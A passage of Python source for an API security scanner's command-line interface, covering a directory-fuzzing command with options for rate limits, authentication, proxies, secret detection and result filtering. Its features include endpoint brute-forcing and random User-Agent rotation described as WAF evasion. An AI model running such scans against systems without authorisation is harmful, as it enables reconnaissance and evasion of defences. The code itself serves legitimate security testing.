    • WAF detection and evasion techniques
    • Advanced payload encoding and obfuscation
    • CORS analysis and security headers testing
    • Multi-format reporting with CI/CD integration
    • JWT token manipulation and analysis
    
    \b
    Basic Commands:
      python apileaks.py dir --target URL              # Directory fuzzing
      python apileaks.py par --target URL              # Parameter fuzzing  
      python apileaks.py full --target URL             # Full security scan
    
    \b
    Advanced Examples:
      python apileaks.py full --target URL --enable-advanced
      python apileaks.py full --target URL --detect-framework --fuzz-versions
      python apileaks.py full --target URL --user-agent-random --enable-waf-evasion
    
    \b
    CI/CD Integration:
      python apileaks.py full --target URL --ci-mode --fail-on critical
    
    \b
    JWT Utilities:
      python apileaks.py jwt decode TOKEN
      python apileaks.py jwt encode '{"sub":"user"}' --secret key
    """
    ctx.ensure_object(dict)
    ctx.obj['no_banner'] = no_banner
    
    # Print banner unless suppressed or showing help
    if not no_banner and ctx.info_name != 'help':
        print_banner()


@cli.command()
@click.option('--target', '-t', required=True, help='Target URL to scan')
@click.option('--wordlist', '-w', 'wordlist', multiple=True,
              help='Wordlist file for directory fuzzing. Repeatable; merged and '
                   'de-duplicated across all values. Use "-" to read entries from stdin.')
@click.option('--openapi', 'openapi', multiple=True, type=click.Path(),
              help='OpenAPI/Swagger document (JSON or YAML) to seed discovery from. Repeatable.')
@click.option('--postman', 'postman', multiple=True, type=click.Path(),
              help='Postman collection to seed discovery from. Repeatable.')
@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--methods', default='GET,POST,PUT,DELETE,PATCH', 
              help='HTTP methods to test (comma-separated)')
@click.option('--depth', 'depth', type=int, default=None, callback=_validate_depth,
              help='Max recursion depth for discovery (0 = no recursion). '
                   'Overrides APILEAK_MAX_DEPTH and the config default (3).')
@click.option('--recursive/--no-recursive', 'recursive', default=None,
              help='Enable or disable recursive discovery (default: enabled).')
@click.option('--max-requests', 'max_requests', type=int, default=None, callback=_validate_max_requests,
              help='Global request budget for discovery (default: unbounded).')
@click.option('--concurrency', 'concurrency', type=int, default=None, callback=_validate_concurrency,
              help='Max concurrent in-flight discovery requests (default: 50).')
@click.option('--confirm-hits', 'confirm_hits', type=int, default=None, callback=_validate_confirm_hits,
              metavar='N',
              help='Enable Hit_Confirmation: re-request each interesting candidate N times '
                   'and record it only when the responses are consistent (must be >= 1; '
                   'default: off).')
@click.option('--timeout', 'timeout', type=float, default=None, callback=_validate_timeout,
              help='Per-request timeout in seconds applied to every discovery request '
                   '(must be > 0; default: 10).')
@click.option('--retries', 'retries', type=int, default=None, callback=_validate_retries,
              help='Number of automatic retries for each failed discovery request '
                   '(must be >= 0; default: 2).')
@click.option('--extensions', '-x', 'extensions', multiple=True, metavar='EXT',
              help='File extensions to append to each wordlist entry (comma-separated, repeatable). '
                   'e.g. -x json,php or -x .json -x .php. Leading dots are optional.')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@click.option('--header', '-H', 'header', multiple=True, metavar='"Name: Value"',
              help='Custom header applied to every discovery request, "Name: Value" format. Repeatable.')
@click.option('--cookie', 'cookie', metavar='COOKIE',
              help='Raw Cookie header string applied to every discovery request.')
@click.option('--basic-auth', 'basic_auth', metavar='user:pass',
              help='HTTP Basic credentials (user:pass) sent as an Authorization header on every discovery request.')
@click.option('--enumerate-methods', 'enumerate_methods', is_flag=True, default=False,
              help='Enumerate allowed HTTP methods per discovered endpoint via an OPTIONS '
                   'request (parses the Allow header; default: off).')
@click.option('--graphql', 'graphql', is_flag=True, default=False,
              help='Probe common GraphQL paths against the target and report whether '
                   'introspection is enabled (read-only introspection query; default: off).')
@click.option('--response', help='Filter by response codes (e.g., 200,301,404 or 200-300)')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@click.option('--match-size', 'match_size', multiple=True, metavar='EXPR',
              help='Match results whose response body size (bytes) satisfies EXPR (e.g. >100, <50, 10-20, 200). Repeatable.')
@click.option('--match-words', 'match_words', multiple=True, metavar='EXPR',
              help='Match results whose response word count satisfies EXPR. Repeatable.')
@click.option('--match-lines', 'match_lines', multiple=True, metavar='EXPR',
              help='Match results whose response line count satisfies EXPR. Repeatable.')
@click.option('--match-regex', 'match_regex', multiple=True, metavar='REGEX',
              help='Match results whose response body matches the regular expression REGEX. Repeatable.')
@click.option('--match-time', 'match_time', multiple=True, metavar='EXPR',
              help='Match results whose response time (seconds) satisfies EXPR. Repeatable.')
@click.option('--filter-size', 'filter_size', multiple=True, metavar='EXPR',
              help='Exclude results whose response body size (bytes) satisfies EXPR. Repeatable.')
@click.option('--filter-words', 'filter_words', multiple=True, metavar='EXPR',
              help='Exclude results whose response word count satisfies EXPR. Repeatable.')
@click.option('--filter-lines', 'filter_lines', multiple=True, metavar='EXPR',
              help='Exclude results whose response line count satisfies EXPR. Repeatable.')
@click.option('--filter-regex', 'filter_regex', multiple=True, metavar='REGEX',
              help='Exclude results whose response body matches the regular expression REGEX. Repeatable.')
@click.option('--filter-time', 'filter_time', multiple=True, metavar='EXPR',
              help='Exclude results whose response time (seconds) satisfies EXPR. Repeatable.')
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during directory fuzzing')
@click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing during directory discovery')
@click.option('--save-session', 'save_session', type=click.Path(), help='Save discovery results to a JSON session file (source of truth for reload)')
@click.option('--load-session', 'load_session', type=click.Path(), help='Reload discovery results exclusively from a JSON session file (skips discovery)')
@click.option('--checkpoint', 'checkpoint', type=click.Path(), help='Periodically write a discovery checkpoint to PATH so an interrupted run can be resumed (atomic writes)')
@click.option('--resume', 'resume', type=click.Path(), help='Resume an interrupted discovery run from the discovery checkpoint at PATH (loaded before discovery; combine with --checkpoint to keep checkpointing)')
@click.option('--export', 'export_format', type=click.Choice(['md', 'txt']), help='Write a human-readable discovery export in the selected format (md or txt)')
@click.option('--export-file', 'export_file', type=click.Path(), help='Destination path for the human-readable export (extension selects the format)')
@click.option('--output-format', 'output_format', type=click.Choice(['csv', 'jsonl']), help='Write a machine-readable discovery output in the selected format (csv or jsonl)')
@click.option('--output-file', 'output_file', type=click.Path(), help='Destination path for the machine-readable output (extension selects the format)')
@click.option('--interactive', '--triage', 'interactive', is_flag=True, help='Enable interactive triage mode (opt-in; auto-disabled in CI mode)')
@click.option('--scan-scope', 'scan_scope', metavar='SCOPE', default=None,
              help='Non-interactively define a Batch_Scan_Scope as all discovered records of a '
                   'Status_Code_Class (2xx, 3xx, 4xx, 5xx) or an EndpointStatus (valid, '
                   'auth_required) and run an OWASP scan over them. In CI mode this is the only '
                   'way to define the scan scope (the interactive prompt never runs).')
@click.option('--ci-mode', 'ci_mode', is_flag=True, help='Enable CI mode (disables the interactive triage prompt so it never blocks a pipeline)')
@click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets. SOCKS5 proxies with auth are supported, e.g. socks5://user:pass@host:port.')
@click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
@click.option('--client-cert', 'client_cert', metavar='PATH[:KEY]', default=None, callback=_validate_client_cert,
              help='Client certificate for mutual TLS, presented on every discovery request. '
                   'A combined cert+key PEM PATH, or a cert:key pair of paths.')
@click.option('--ca-bundle', 'ca_bundle', metavar='PATH', default=None, callback=_validate_ca_bundle,
              help='Custom CA bundle used to verify target certificates for every discovery request.')
@click.option('--allow-cross-domain-redirects', 'allow_cross_domain_redirects', is_flag=True, default=False,
              help='Follow redirects to other domains during discovery. By default discovery '
                   'follows redirects only to the same domain as the originating request.')
@click.option('--resolve', 'resolve', metavar='host:ip', default=None, callback=_validate_resolve,
              help='Override DNS resolution for the named host to the supplied IP for every '
                   'discovery request (e.g. api.example.com:127.0.0.1).')
@click.option('--detect-secrets', 'detect_secrets', is_flag=True, default=False,
              help='Scan each discovery response body and headers for secrets/leaked '
                   'credentials (read-only; default: off). Matched values are redacted.')
@click.option('--secret-patterns', 'secret_patterns', metavar='PATH', default=None,
              callback=_validate_secret_patterns,
              help='Path to a JSON file mapping pattern names to regex strings used for '
                   'secret detection. Defaults to the built-in patterns when not supplied.')
@click.option('--include-path', 'include_path', multiple=True, metavar='REGEX',
              help='Only persist discovered endpoints whose path or URL matches REGEX '
                   '(storage-time scope). Repeatable. Exclude takes precedence over include.')
@click.option('--exclude-path', 'exclude_path', multiple=True, metavar='REGEX',
              help='Never persist discovered endpoints whose path or URL matches REGEX '
                   '(storage-time scope). Repeatable. Takes precedence over --include-path.')
@click.option('--include-status', 'include_status', metavar='SELECTION', default=None,
              help='Only persist discovered endpoints whose status matches SELECTION: a '
                   "status class like '2xx' or explicit codes/ranges like '200,404' or "
                   "'200-300' (storage-time scope).")
@click.option('--exclude-status', 'exclude_status', metavar='SELECTION', default=None,
              help='Never persist discovered endpoints whose status matches SELECTION: a '
                   "status class like '2xx' or explicit codes/ranges like '200,404' or "
                   "'200-300' (storage-time scope). Takes precedence over --include-status.")
@click.option('--recursion-status', 'recursion_status', metavar='CLASSES', default=None,
              help='Restrict recursion to endpoints whose status class is in CLASSES: a '
                   "comma-separated list of status classes like '2xx,3xx'. Only narrows the "
                   'default VALID/AUTH_REQUIRED recursion; never relaxes it.')
@click.option('--recursion-type', 'recursion_type', metavar='TYPES', default=None,
              help='Restrict recursion to endpoints whose type is in TYPES: a comma-separated '
                   "list of endpoint types like 'admin,api_version'. Only narrows the default "
                   'recursion; never relaxes it.')
@click.pass_context
def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, json_logs, rate_limit, methods, depth, recursive, max_requests, concurrency, confirm_hits, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, header, cookie, basic_auth, enumerate_methods, graphql, response, status_code, match_size, match_words, match_lines, match_regex, match_time, filter_size, filter_words, filter_lines, filter_regex, filter_time, detect_framework, fuzz_versions, save_session, load_session, checkpoint, resume, export_format, export_file, output_format, output_file, interactive, scan_scope, ci_mode, proxy, proxy_verify_ssl, client_cert, ca_bundle, allow_cross_domain_redirects, resolve, detect_secrets, secret_patterns, include_path, exclude_path, include_status, exclude_status, recursion_status, recursion_type):
    """Directory/endpoint fuzzing - discover hidden endpoints and directories
    
    \b
    Examples:
      python apileaks.py dir --target https://api.example.com
      python apileaks.py dir --target URL --wordlist custom.txt --rate-limit 5
      python apileaks.py dir --target URL --user-agent-random --detect-framework
      python apileaks.py dir --target URL --save-session session.json --export md --export-file results.md
      python apileaks.py dir --target URL --load-session session.json --status-code 2xx
      python apileaks.py dir --target URL --load-session session.json --interactive
      python apileaks.py dir --target URL --interactive --ci-mode --save-session session.json
      python apileaks.py dir --target URL --proxy http://127.0.0.1:8080 --jwt TOKEN
    """
    
    # Validate user agent options
    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)

    # Validate basic-auth conflicts/format before any discovery runs so a
    # --basic-auth + --jwt conflict (Req 24.5) or a colon-less value (Req 24.6)
    # exits before any Discovery_Request is issued.
    validate_basic_auth_options(basic_auth, jwt)
    
    # Setup logging
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    logger = get_logger("dir")
    
    logger.info("APILeak directory fuzzing starting", version="0.1.0", target=target)

    # Build --match-*/--filter-* expressions into the '<attribute>:<expression>'
    # grammar understood by parse_selectors. Status matching continues to use the
    # existing --status-code flag, so it is intentionally not included here.
    match_exprs = (
        [f"size:{expr}" for expr in match_size]
        + [f"words:{expr}" for expr in match_words]
        + [f"lines:{expr}" for expr in match_lines]
        + [f"regex:{expr}" for expr in match_regex]
        + [f"time:{expr}" for expr in match_time]
    )
    filter_exprs = (
        [f"size:{expr}" for expr in filter_size]
        + [f"words:{expr}" for expr in filter_words]
        + [f"lines:{expr}" for expr in filter_lines]
        + [f"regex:{expr}" for expr in filter_regex]
        + [f"time:{expr}" for expr in filter_time]
    )

    # Parse selectors at CLI parse time so a syntactically invalid expression is
    # surfaced as a descriptive CLI error and NO Endpoint_Discovery is performed
    # (Requirement 22.9).
    try:
        matchers, filters = parse_selectors(match_exprs, filter_exprs)
    except SelectorError as exc:
        logger.error("Invalid response selector expression", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)

    # Parse the storage-time Path_Scope and Storage_Status_Selection up front so
    # an invalid regex or out-of-range/unrecognized status value is surfaced as a
    # descriptive CLI error naming the offending value and NO Endpoint_Discovery
    # is performed (Requirements 33.1, 33.5, 33.8, 33.9). The Recursion_Scope is
    # parsed alongside them so an unrecognized status class or endpoint type is
    # likewise surfaced as a descriptive CLI error naming the value before any
    # discovery runs (Requirements 34.1, 34.2, 34.8). Mirrors the
    # exit-before-discovery handling used for response selectors above.
    try:
        path_scope = parse_path_scope(include_path, exclude_path)
        storage_status = parse_storage_status_selection(
            include_status, exclude_status
        )
        recursion_scope = parse_recursion_scope(recursion_status, recursion_type)
    except (PathScopeError, StorageStatusError, RecursionScopeError) as exc:
        logger.error("Invalid discovery scope value", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)

    # Validate the non-interactive Batch_Scan_Scope token up front so an
    # unrecognized --scan-scope value is surfaced as a descriptive CLI error
    # naming the value and NO scan (and no discovery) is performed
    # (Requirement 36.7). The token validity is record-independent, so validate
    # it against an empty record set here and select the matching records after
    # discovery.
    if scan_scope is not None:
        try:
            select_scope_records([], scan_scope)
        except ScanScopeError as exc:
            logger.error("Invalid scan scope value", error=str(exc))
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)

    # Resolve the discovery candidate set from any Spec_Import sources and the
    # (repeatable, optionally stdin) wordlists before any discovery runs. An
    # unparseable/unrecognized spec is surfaced as a CLI error performing no
    # Endpoint_Discovery (Requirement 25.6).
    try:
        candidate_set, seed_methods, wordlist_path = _resolve_dir_candidates(
            wordlist, openapi, postman
        )
    except SpecImportError as exc:
        logger.error("Spec import failed", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)

    # An empty merged candidate set completes without issuing any
    # Discovery_Request and reports that no candidates were available
    # (Requirement 25.7). A reloaded session sources records from the session
    # file and performs no discovery, so the check does not apply there.
    if candidate_set is not None and not candidate_set and not load_session:
        click.echo("No candidates available: no wordlist entries or spec seeds to scan.")
        return

    # Resume from a Discovery_Checkpoint (Requirement 37.2). The checkpoint is
    # loaded up front, BEFORE any Endpoint_Discovery runs, so a missing,
    # unreadable, or malformed checkpoint is surfaced as a descriptive CLI error
    # identifying the artifact and NO discovery is performed (Requirement 37.5).
    # The loaded checkpoint then seeds the fuzzer so already-tested candidates
    # are skipped and checkpointed results merge with newly discovered ones
    # (Requirements 37.3, 37.4). Combine with --checkpoint to keep checkpointing
    # a resumed run.
    resume_checkpoint = None
    if resume:
        try:
            resume_checkpoint = DiscoveryCheckpoint.load(resume)
        except DiscoveryCheckpointError as exc:
            logger.error("Discovery checkpoint resume error", error=str(exc))
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)
        logger.info(
            "Resuming discovery from checkpoint",
            path=resume,
            tested=len(resume_checkpoint.tested),
            records=len(resume_checkpoint.results),
        )

    # Discovery triage is an additive workflow layered on top of discovery. It is
    # only engaged when the user opts in via a triage flag; otherwise the command
    # behaves exactly as before and runs the standard enhanced scan. Supplying a
    # response matcher/filter also engages triage so the selection takes effect.
    triage_requested = bool(
        save_session or load_session or export_format or export_file
        or output_format or output_file or interactive
        or scan_scope or matchers or filters
    )

    if triage_requested:
        _run_dir_triage(
            target=target,
            wordlist_path=wordlist_path,
            candidate_set=candidate_set,
            seed_methods=seed_methods,
            output=output,
            rate_limit=rate_limit,
            methods=methods,
            user_agent_random=user_agent_random,
            user_agent_custom=user_agent_custom,
            user_agent_file=user_agent_file,
            jwt=jwt,
            header=header,
            cookie=cookie,
            basic_auth=basic_auth,
            response=response,
            status_code=status_code,
            matchers=matchers,
            filters=filters,
            detect_framework=detect_framework,
            fuzz_versions=fuzz_versions,
            save_session=save_session,
            load_session=load_session,
            export_format=export_format,
            export_file=export_file,
            output_format=output_format,
            output_file=output_file,
            interactive=interactive,
            scan_scope=scan_scope,
            ci_mode=ci_mode,
            proxy=proxy,
            proxy_verify_ssl=proxy_verify_ssl,
            client_cert=client_cert,
            ca_bundle=ca_bundle,
            allow_cross_domain_redirects=allow_cross_domain_redirects,
            resolve=resolve,
            detect_secrets=detect_secrets,
            secret_patterns=secret_patterns,
            path_scope=path_scope,
            storage_status=storage_status,
            checkpoint=checkpoint,
            resume_checkpoint=resume_checkpoint,
            logger=logger,
        )
        return

    try:
        # Prepare user agent configuration
        user_agent_config = None
        if user_agent_random:
            user_agent_config = {'random': True}
        elif user_agent_custom:
            user_agent_config = {'custom': user_agent_custom}
        elif user_agent_file:
            user_agents = load_user_agents_from_file(user_agent_file)
            user_agent_config = {'file_list': user_agents}
        
        # Prepare output filename
        output_filename = prepare_output_filename(output)
        
        # Prepare advanced configuration for directory fuzzing
        advanced_config = {
            'detect_framework': detect_framework,
            'fuzz_versions': fuzz_versions,
            'framework_confidence': 0.6  # Default confidence for dir mode
        }
        
        # Parse status code filter for HTTP output
        status_code_filter = parse_status_codes(status_code) if status_code else None
        
        # Parse operator-supplied discovery headers, cookie, and basic-auth
        # (Requirement 24.1). The cookie is carried as a 'Cookie' header so it
        # rides the same custom_headers path as --header (Requirement 24.3).
        extra_headers = parse_header_options(header)
        if cookie:
            extra_headers['Cookie'] = cookie
        basic_auth_creds = parse_basic_auth(basic_auth)
        
        # Create default configuration for directory fuzzing
        config_dict = create_default_config(target, wordlist_path, "dir", user_agent_config, output_filename, advanced_config, status_code_filter, extra_headers, basic_auth_creds)
        config_dict['proxy'] = proxy
        config_dict['proxy_verify_ssl'] = proxy_verify_ssl
        # Thread transport/TLS options for discovery (Requirement 29). The CLI
        # validators have already parsed/validated these before discovery: the
        # client cert (str or (cert, key) tuple), CA bundle path, and the parsed
        # --resolve (host, ip) tuple. The cross-domain redirect toggle is carried
        # on the endpoints config consumed by _handle_redirect.
        config_dict['client_cert'] = client_cert
        config_dict['ca_bundle'] = ca_bundle
        config_dict['resolve'] = resolve
        config_dict['fuzzing']['endpoints']['allow_cross_domain_redirects'] = allow_cross_domain_redirects

        # Thread the merged in-memory candidate set and per-seed methods into the
        # fuzzing config when Spec_Import sources or repeated/stdin wordlists were
        # supplied (Requirements 25.3, 25.4). When candidate_set is None the
        # single-file wordlist path above is used, preserving prior behavior.
        if candidate_set is not None:
            config_dict['fuzzing']['endpoints']['candidate_set'] = candidate_set
            config_dict['fuzzing']['endpoints']['seed_methods'] = seed_methods
        
        # Apply CLI overrides
        if rate_limit:
            config_dict['rate_limiting']['requests_per_second'] = rate_limit
        if methods:
            config_dict['fuzzing']['endpoints']['methods'] = [m.strip() for m in methods.split(',')]
        # Thread discovery recursion / budget / concurrency controls into the
        # fuzzing config (Requirements 17, 18, 20).
        config_dict['fuzzing']['max_depth'] = resolve_max_depth(depth)
        if recursive is not None:
            config_dict['fuzzing']['recursive'] = recursive
        if max_requests is not None:
            config_dict['fuzzing']['max_requests'] = max_requests
        if concurrency is not None:
            config_dict['fuzzing']['concurrency'] = concurrency
        # Thread the Hit_Confirmation selection into the fuzzing config
        # (Requirements 35.1, 35.7). Off by default (None) so discovery keeps its
        # single-request behavior; when --confirm-hits N is supplied, enable
        # confirmation with N re-requests. _build_fuzzing_config reads this key
        # and accepts either a dict or a HitConfirmationConfig.
        if confirm_hits is not None:
            config_dict['fuzzing']['hit_confirmation'] = {'enabled': True, 'count': confirm_hits}
        # Thread the storage-time Path_Scope and Storage_Status_Selection onto
        # the fuzzing config so the EndpointFuzzer applies them at storage time
        # (Requirements 33.1-33.7). _build_fuzzing_config reads these keys and
        # sets them on the FuzzingConfig the fuzzer receives.
        config_dict['fuzzing']['path_scope'] = path_scope
        config_dict['fuzzing']['storage_status'] = storage_status
        # Thread the Recursion_Scope onto the fuzzing config so recursion only
        # descends into records the scope admits (Requirements 34.1-34.3).
        # _build_fuzzing_config reads this key and sets it on the FuzzingConfig
        # the orchestrator consults; None (no flags) preserves the default
        # VALID/AUTH_REQUIRED recursion (34.4).
        config_dict['fuzzing']['recursion_scope'] = recursion_scope
        # Thread the per-request resilience controls into the config
        # (Requirement 28). --timeout becomes the target read timeout consumed by
        # HTTPRequestEngine (28.1); --retries becomes the Retry_Limit sourced into
        # RetryConfig.max_attempts (28.2). Both fall back to the config defaults
        # when not supplied.
        if timeout is not None:
            config_dict['target']['timeout'] = timeout
        if retries is not None:
            config_dict['fuzzing']['retries'] = retries
        # Values are comma-separated AND repeatable: split each value on commas,
        # flatten, then normalize to canonical single-dot form.
        config_dict['fuzzing'].setdefault('endpoints', {})
        config_dict['fuzzing']['endpoints']['extensions'] = normalize_extensions(
            [ext for value in extensions for ext in value.split(',')]
        )
        # Thread the Method_Enumeration toggle into the fuzzing config
        # (Requirement 26.1); default off unless --enumerate-methods is passed.
        config_dict['fuzzing']['endpoints']['enumerate_methods'] = enumerate_methods
        # Thread the GraphQL discovery toggle into the fuzzing config
        # (Requirement 27.1); default off unless --graphql is passed.
        config_dict['fuzzing']['endpoints']['graphql'] = graphql
        # Thread the Secret_Detection toggle and optional custom Secret_Patterns
        # into the secret_scan config (Requirement 30.1/30.6). Detection is off
        # unless --detect-secrets is passed; when --secret-patterns supplies a
        # name->regex map it overrides the built-in DEFAULT_SECRET_PATTERNS.
        config_dict.setdefault('secret_scan', {})
        config_dict['secret_scan']['enabled'] = detect_secrets
        if secret_patterns is not None:
            config_dict['secret_scan']['patterns'] = secret_patterns
        if depth == 0:
            config_dict['fuzzing']['recursive'] = False  # depth 0 => depth-0 pass only (17.3)
        if jwt:
            config_dict['authentication']['contexts'][0]['token'] = jwt
            config_dict['authentication']['contexts'][0]['type'] = 'bearer'
        if response:
            config_dict['fuzzing']['response_filter'] = parse_response_codes(response)
        
        # Load configuration through ConfigurationManager
        config_manager = ConfigurationManager()
        apileak_config = config_manager.load_config_from_dict(config_dict)
        
        # Validate configuration
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)
        
        # Run the scan with a live Progress_Display gated by CI_Mode/TTY
        # (Requirement 32). The display reports against the configured
        # Request_Budget (max_requests) when one is set.
        discovery_progress = _build_discovery_progress(
            ci_mode, apileak_config.fuzzing.max_requests
        )
        asyncio.run(run_enhanced_apileak(
            apileak_config, discovery_progress=discovery_progress,
            checkpoint_path=checkpoint, resume_checkpoint=resume_checkpoint
        ))
        
    except Exception as e:
        logger.error("Directory fuzzing failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


def _build_discovery_progress(ci_mode, max_requests):
    """Build the live Progress_Display for the ``dir`` command (Requirement 32).

    The display is enabled only for an interactive session that is **not** in
    CI_Mode and whose standard output is a TTY:
    ``enabled = (not ci_mode) and sys.stdout.isatty()`` — the exact gating that
    governs the interactive triage prompt. This disables it in CI_Mode
    (Requirement 32.3) and when stdout is not a TTY so it never interferes with
    piped output (Requirement 32.4). ``total`` is the Request_Budget
    (``max_requests``); when ``None`` the display omits the consumed/remaining
    budget figures (Requirement 32.5).
    """
    enabled = (not ci_mode) and sys.stdout.isatty()
    return DiscoveryProgress(enabled=enabled, total=max_requests)


def _echo_discovery_control_status(core):
    """Surface discovery recursion-control flags in the discovery summary.

    Reports when the Request_Budget was reached (Requirement 18.5), when
    Catch_All_Response behavior was detected (Requirement 19.5), and when a
    GraphQL endpoint with introspection enabled was detected (Requirement 27.4).
    The values are read defensively via :meth:`APILeakCore.get_discovery_status`,
    so the summary stays silent unless a flag is set (including before the
    underlying fuzzer attributes exist).
    """
    status = core.get_discovery_status()
    if status.get("budget_reached"):
        click.echo(
            "⚠️  Request budget reached: discovery stopped early, "
            "results may be partial"
        )
    if status.get("catch_all_detected"):
        click.echo(
            "⚠️  Catch-all response detected: wildcard endpoints excluded "
            "from recursive discovery"
        )
    graphql_endpoint = status.get("graphql_introspection_endpoint")
    if graphql_endpoint:
        click.echo(
            f"🔎 GRAPHQL_INTROSPECTION_ENABLED: introspection is enabled on "
            f"{graphql_endpoint}"
        )
    _echo_fuzzing_stats(core)
    _echo_secret_findings(core)


def _echo_fuzzing_stats(core):
    """Surface the discovery :class:`FuzzingStats` summary line (Requirement 31.3).

    Reads the fuzzing statistics defensively via
    :meth:`APILeakCore.get_fuzzing_stats` (accessed through ``getattr`` so the
    function stays safe when called with a fake/partial ``core`` that does not
    expose the accessor, as in the discovery-control tests). When stats are
    available, prints a single line reporting endpoints tested, endpoints
    discovered, total requests, success rate, and recursion depth reached. Stays
    silent when stats are unavailable (no discovery ran).
    """
    get_stats = getattr(core, "get_fuzzing_stats", None)
    if get_stats is None:
        return
    stats = get_stats()
    if stats is None:
        return

    endpoints_tested = getattr(stats, "endpoints_tested", 0)
    endpoints_discovered = getattr(stats, "endpoints_discovered", 0)
    total_requests = getattr(stats, "total_requests", 0)
    success_rate = getattr(stats, "success_rate", 0.0)
    recursive_depth = getattr(stats, "recursive_depth_reached", 0)

    click.echo(
        f"📊 Discovery stats: {endpoints_tested} endpoint(s) tested, "
        f"{endpoints_discovered} discovered, {total_requests} request(s), "
        f"{success_rate:.1f}% success rate, recursion depth "
        f"{recursive_depth}"
    )


def _echo_secret_findings(core):
    """Surface redacted secret findings in the discovery summary (Requirement 30).

    Reads the :class:`SecretFinding` records collected during discovery via
    :meth:`APILeakCore.get_secret_findings` (read defensively). Each finding is
    displayed with its pattern name, originating endpoint/method, and the
    already-redacted matched value, so the full secret value is never echoed
    (Requirement 30.4). The summary stays silent when secret detection was
    disabled or nothing matched (Requirement 30.7).
    """
    get_findings = getattr(core, "get_secret_findings", None)
    if get_findings is None:
        return
    findings = get_findings()
    if not findings:
        return

    click.echo(
        f"🔑 SECRET_FINDINGS: {len(findings)} potential secret(s) detected "
        f"in discovery responses (values redacted):"
    )
    for finding in findings:
        endpoint = getattr(finding, "endpoint", "")
        method = getattr(finding, "method", "")
        pattern_name = getattr(finding, "pattern_name", "")
        redacted = getattr(finding, "redacted", "")
        location = f"{method} {endpoint}".strip()
        click.echo(f"   - [{pattern_name}] {location}: {redacted}")


async def _discover_endpoints_for_triage(apileak_config, discovery_progress=None, checkpoint_path=None, resume_checkpoint=None):
    """Run discovery for the triage workflow and return endpoints + soft-404 baseline.

    Builds an :class:`APILeakCore`, executes a scan against the configured target
    (in ``dir`` mode no OWASP modules are enabled, so this is effectively the
    endpoint discovery phase), and returns the discovered ``Endpoint`` objects so
    the caller can project them into :class:`DiscoveryResult` records, together
    with the :class:`Soft404Baseline` derived from the catch-all probes (or
    ``None`` when no baseline was captured).

    Args:
        apileak_config: The loaded APILeak configuration.
        discovery_progress: Optional live Progress_Display (Requirement 32),
            attached to the core before discovery runs so the endpoint fuzzer can
            render live progress. ``None`` (or a disabled instance) runs discovery
            without a display.

    Returns:
        A ``(endpoints, soft_404_baseline)`` tuple. ``soft_404_baseline`` is
        ``None`` when the discovery probes did not yield a single signature.
    """
    core = APILeakCore(apileak_config)

    # Attach the live Progress_Display (if any) before discovery runs so the
    # endpoint fuzzer can render it (Requirement 32).
    if discovery_progress is not None:
        core.discovery_progress = discovery_progress

    # Attach the resume/checkpoint state (Requirement 37) before discovery runs,
    # mirroring run_enhanced_apileak: ``checkpoint_path`` enables periodic writes
    # and ``resume_checkpoint`` (a pre-loaded DiscoveryCheckpoint) seeds the
    # fuzzer before discovery. Both default to None, leaving discovery unchanged.
    if checkpoint_path is not None:
        core.discovery_checkpoint_path = checkpoint_path
    if resume_checkpoint is not None:
        core.discovery_resume_checkpoint = resume_checkpoint

    health_status = await core.health_check()
    if health_status.get("status") != "healthy":
        get_logger("dir").warning(
            "Health check indicates issues", status=health_status
        )

    await core.run_scan(apileak_config.target.base_url)
    _echo_discovery_control_status(core)

    # Reach the endpoint fuzzer defensively to derive the Soft_404_Baseline from
    # the catch-all probes that already ran (Requirement 22.5); deriving it issues
    # no extra requests. Absence of a fuzzer/baseline simply means no soft-404
    # suppression is applied.
    orchestrator = getattr(core, "fuzzing_orchestrator", None)
    fuzzer = getattr(orchestrator, "endpoint_fuzzer", None)
    soft_404_baseline = calibrate_soft_404(fuzzer) if fuzzer is not None else None

    return core.get_discovered_endpoints(), soft_404_baseline


def _select_records(
    records,
    *,
    endpoints=None,
    matchers,
    filters,
    soft_404_baseline,
):
    """Apply response selection as a post-discovery projection (Requirement 22).

    Builds in-memory-only :class:`DiscoveryResultEx` views over ``records`` (the
    persisted :class:`DiscoveryResult` projection is never widened, so the
    Requirement 14 session round-trip stays intact), applies the matchers and
    filters conjunctively (Requirements 22.2-22.4), then **independently** drops
    any record matching the Soft_404_Baseline (Requirements 22.6, 22.8). Returns
    the retained :class:`DiscoveryResult` records in their original relative
    order.

    These selections (response matchers/filters and soft-404 noise suppression)
    narrow the records that feed the table, session, export, and interactive
    selection. The existing ``Status_Code_Filter`` (Requirement 13) is applied
    separately as a **display-only** filter by the table renderer and the
    interactive prompt, so it never omits records from the persisted session or
    export (Requirement 14.1); the displayed/triaged set therefore still
    satisfies the status filter, matchers, and filters conjunctively
    (Requirement 22.7).

